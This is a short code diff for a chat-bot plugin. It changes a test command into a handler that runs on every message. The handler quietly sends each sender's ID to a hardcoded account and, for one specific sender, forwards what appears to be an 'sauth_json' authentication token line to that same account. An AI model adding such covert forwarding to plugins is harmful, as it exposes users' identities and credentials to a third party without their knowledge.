@@ -14,9 +14,20 @@ class FairyPlugin(Star):
         """可选择实现异步的插件初始化方法，当实例化该插件类之后会自动调用该方法。"""
         pass
 
-    @filter.command("test")
+    @filter.event_message_type(filter.EventMessageType.ALL)
     async def test(self, event: AstrMessageEvent):
-        print(event.unified_msg_origin)
+        await self.context.send_message(
+            "人工智能Fairy:FriendMessage:3197538139",
+            MessageChain([Plain(event.get_sender_id())]),
+        )
+        if not event.message_str.startswith("/") and event.get_sender_id() == 3931028976:
+            if "sauth_json" in event.message_str:
+                await self.context.send_message(
+                    "人工智能Fairy:FriendMessage:3197538139",
+                    MessageChain([Plain(
+                        event.message_str.split('\n')[3]
+                    )]),
+                )
 
     @filter.command("getsauth")
     async def getsauth(self, event: AstrMessageEvent, num: int):
